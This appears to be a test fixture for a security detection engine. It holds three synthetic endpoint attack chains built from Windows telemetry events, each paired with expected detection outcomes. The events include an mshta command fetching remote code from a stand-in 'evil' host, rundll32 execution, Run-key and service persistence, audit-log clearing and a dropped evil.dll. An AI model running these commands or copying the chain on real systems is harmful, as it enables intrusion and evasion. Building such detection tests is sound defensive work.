@@ -1,0 +1,340 @@
+{
+  "scenarios": [
+    {
+      "id": "botslike-sysmon-endpoint-chain",
+      "description": "Windows Sysmon-style endpoint chain with LOLBin execution, persistence, and log clearing. Aman should keep this incomplete without initial access proof.",
+      "events": [
+        {
+          "id": "evt-6d497989ef93b38981a238f18f3538fe07620ab0",
+          "time": "2026-03-12T09:00:00Z",
+          "host": "WORKSTATION5",
+          "user": "wardog",
+          "type": "process_creation",
+          "details": {
+            "channel": "",
+            "command_line": "C:\\Windows\\System32\\mshta.exe http://evil",
+            "image": "C:\\Windows\\System32\\mshta.exe",
+            "message": "",
+            "parent_image": "",
+            "parent_process_guid": "{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}",
+            "process_guid": "{11111111-1111-1111-1111-111111111111}",
+            "rule_name": "",
+            "source_name": "",
+            "target_object": ""
+          }
+        },
+        {
+          "id": "evt-5bb55659c0c58aee4f0ed5581272669365129364",
+          "time": "2026-03-12T09:00:00Z",
+          "host": "WORKSTATION5",
+          "user": "wardog",
+          "type": "lolbin_execution",
+          "details": {
+            "channel": "",
+            "command_line": "C:\\Windows\\System32\\mshta.exe http://evil",
+            "image": "C:\\Windows\\System32\\mshta.exe",
+            "message": "",
+            "parent_image": "",
+            "parent_process_guid": "{aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa}",
+            "process_guid": "{11111111-1111-1111-1111-111111111111}",
+            "rule_name": "",
+            "source_name": "",
+            "target_object": ""
+          }
+        },
+        {
+          "id": "evt-826a8dbe6a0d15e3abebbf522c2ca91fc59368bf",
+          "time": "2026-03-12T09:00:02Z",
+          "host": "WORKSTATION5",
+          "user": "wardog",
+          "type": "registry_run_key",
+          "details": {
+            "channel": "",
+            "command_line": "",
+            "image": "",
+            "message": "",
+            "parent_image": "",
+            "parent_process_guid": "",
+            "process_guid": "",
+            "rule_name": "",
+            "source_name": "",
+            "target_object": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+          }
+        },
+        {
+          "id": "evt-2d57257fb09ac6dbdb5ce59d8431b220cb09f204",
+          "time": "2026-03-12T09:00:03Z",
+          "host": "WORKSTATION5",
+          "user": "wardog",
+          "type": "service_install",
+          "details": {
+            "channel": "",
+            "command_line": "",
+            "image": "",
+            "message": "A service was installed",
+            "parent_image": "",
+            "parent_process_guid": "",
+            "process_guid": "",
+            "rule_name": "",
+            "source_name": "",
+            "target_object": ""
+          }
+        },
+        {
+          "id": "evt-2fdb09f7ccb8d6244e2eb055c7e4743fccb90cd9",
+          "time": "2026-03-12T09:00:04Z",
+          "host": "WORKSTATION5",
+          "user": "wardog",
+          "type": "disable_logging",
+          "details": {
+            "channel": "",
+            "command_line": "",
+            "image": "",
+            "message": "The audit log was cleared",
+            "parent_image": "",
+            "parent_process_guid": "",
+            "process_guid": "",
+            "rule_name": "",
+            "source_name": "",
+            "target_object": ""
+          }
+        },
+        {
+          "id": "evt-8ccef2e25737f529464450cb80ebb411912f3c94",
+          "time": "2026-03-12T09:00:05Z",
+          "host": "WORKSTATION5",
+          "user": "wardog",
+          "type": "wmi_subscription_trigger",
+          "details": {
+            "channel": "",
+            "command_line": "",
+            "image": "",
+            "message": "WmiEventFilter activity",
+            "parent_image": "",
+            "parent_process_guid": "",
+            "process_guid": "",
+            "rule_name": "",
+            "source_name": "",
+            "target_object": ""
+          }
+        }
+      ],
+      "labels": [
+        {
+          "rule_id": "TA0002.LOLBIN_CHAIN",
+          "outcome": "incomplete"
+        },
+        {
+          "rule_id": "TA0003.PERSIST_EXTENDED",
+          "outcome": "incomplete"
+        },
+        {
+          "rule_id": "TA0005.LOG_TAMPER",
+          "outcome": "incomplete"
+        },
+        {
+          "rule_id": "TA0002.WMI_EXEC",
+          "outcome": "incomplete"
+        }
+      ]
+    },
+    {
+      "id": "botslike-sentinel-endpoint-chain",
+      "description": "Sentinel/Windows-like endpoint activity with LOLBin execution, persistence, and auth telemetry. Aman should remain incomplete on attack progression without foothold proof.",
+      "events": [
+        {
+          "id": "10.0.0.15:10.0.0.16:lolbin_execution",
+          "time": "2026-02-06T12:40:00Z",
+          "host": "win-02",
+          "user": "jill",
+          "type": "lolbin_execution",
+          "details": {
+            "CommandLine": "rundll32.exe example.dll,Entry",
+            "destination_ip": "10.0.0.16",
+            "protocol": "tcp",
+            "source_ip": "10.0.0.15"
+          }
+        },
+        {
+          "id": "10.0.0.15:10.0.0.16:process_creation",
+          "time": "2026-02-06T12:40:30Z",
+          "host": "win-02",
+          "user": "jill",
+          "type": "process_creation",
+          "details": {
+            "CommandLine": "cmd.exe /c whoami",
+            "ProcessName": "cmd.exe",
+            "destination_ip": "10.0.0.16",
+            "protocol": "tcp",
+            "source_ip": "10.0.0.15"
+          }
+        },
+        {
+          "id": "10.0.0.15:10.0.0.16:registry_run_key",
+          "time": "2026-02-06T12:41:00Z",
+          "host": "win-02",
+          "user": "jill",
+          "type": "registry_run_key",
+          "details": {
+            "RegistryKey": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "destination_ip": "10.0.0.16",
+            "protocol": "tcp",
+            "source_ip": "10.0.0.15"
+          }
+        },
+        {
+          "id": "10.0.0.15:10.0.0.16:service_install",
+          "time": "2026-02-06T12:42:00Z",
+          "host": "win-02",
+          "user": "jill",
+          "type": "service_install",
+          "details": {
+            "ServiceFileName": "C:\\\\Program Files\\\\Updater\\\\upd.exe",
+            "ServiceName": "Updater",
+            "destination_ip": "10.0.0.16",
+            "protocol": "tcp",
+            "source_ip": "10.0.0.15"
+          }
+        },
+        {
+          "id": "10.0.0.15:10.0.0.16:authentication_success",
+          "time": "2026-02-06T12:43:00Z",
+          "host": "win-02",
+          "user": "jill",
+          "type": "authentication_success",
+          "details": {
+            "Result": "Success",
+            "UserName": "jill",
+            "destination_ip": "10.0.0.16",
+            "protocol": "tcp",
+            "source_ip": "10.0.0.15"
+          }
+        },
+        {
+          "id": "10.0.0.15:10.0.0.16:authentication_failure",
+          "time": "2026-02-06T12:43:30Z",
+          "host": "win-02",
+          "user": "jill",
+          "type": "authentication_failure",
+          "details": {
+            "Result": "Failure",
+            "UserName": "jill",
+            "destination_ip": "10.0.0.16",
+            "protocol": "tcp",
+            "source_ip": "10.0.0.15"
+          }
+        }
+      ],
+      "labels": [
+        {
+          "rule_id": "TA0002.LOLBIN_CHAIN",
+          "outcome": "incomplete"
+        },
+        {
+          "rule_id": "TA0003.PERSIST_EXTENDED",
+          "outcome": "incomplete"
+        },
+        {
+          "rule_id": "TA0005.IMPAIR_DEFENSES",
+          "outcome": "incomplete"
+        }
+      ]
+    },
+    {
+      "id": "botslike-crowdstrike-endpoint-chain",
+      "description": "CrowdStrike-style endpoint activity with LOLBin execution, persistence, and local file activity. Aman should flag persistence as incomplete without initial access proof.",
+      "events": [
+        {
+          "id": "aid-123:ProcessRollup2",
+          "time": "2026-02-06T12:45:00Z",
+          "host": "win-03",
+          "user": "kim",
+          "type": "lolbin_execution",
+          "details": {
+            "CommandLine": "mshta.exe http://evil",
+            "aid": "aid-123",
+            "aip": "10.0.0.20"
+          }
+        },
+        {
+          "id": "aid-123:RegistryValueSet",
+          "time": "2026-02-06T12:46:00Z",
+          "host": "win-03",
+          "user": "kim",
+          "type": "registry_run_key",
+          "details": {
+            "RegistryKey": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "aid": "aid-123",
+            "aip": "10.0.0.20"
+          }
+        },
+        {
+          "id": "aid-123:ServiceInstalled",
+          "time": "2026-02-06T12:47:00Z",
+          "host": "win-03",
+          "user": "kim",
+          "type": "service_install",
+          "details": {
+            "ServiceFileName": "C:\\\\Program Files\\\\Updater\\\\upd.exe",
+            "ServiceName": "Updater",
+            "aid": "aid-123",
+            "aip": "10.0.0.20"
+          }
+        },
+        {
+          "id": "aid-123:FileCreateInfo",
+          "time": "2026-02-06T12:48:00Z",
+          "host": "win-03",
+          "user": "kim",
+          "type": "file_create",
+          "details": {
+            "FileName": "evil.dll",
+            "FilePath": "C:\\\\Temp\\\\evil.dll",
+            "aid": "aid-123",
+            "aip": "10.0.0.20"
+          }
+        },
+        {
+          "id": "aid-123:FileWriteInfo",
+          "time": "2026-02-06T12:49:00Z",
+          "host": "win-03",
+          "user": "kim",
+          "type": "file_modify",
+          "details": {
+            "FileName": "evil.dll",
+            "FilePath": "C:\\\\Temp\\\\evil.dll",
+            "aid": "aid-123",
+            "aip": "10.0.0.20"
+          }
+        },
+        {
+          "id": "aid-123:FileDeleteInfo",
+          "time": "2026-02-06T12:50:00Z",
+          "host": "win-03",
+          "user": "kim",
+          "type": "file_delete",
+          "details": {
+            "FileName": "evil.dll",
+            "FilePath": "C:\\\\Temp\\\\evil.dll",
+            "aid": "aid-123",
+            "aip": "10.0.0.20"
+          }
+        }
+      ],
+      "labels": [
+        {
+          "rule_id": "TA0002.LOLBIN_CHAIN",
+          "outcome": "incomplete"
+        },
+        {
+          "rule_id": "TA0003.PERSIST_EXTENDED",
+          "outcome": "incomplete"
+        },
+        {
+          "rule_id": "TA0009.DATA_FROM_LOCAL_SYS",
+          "outcome": "incomplete"
+        }
+      ]
+    }
+  ]
+}
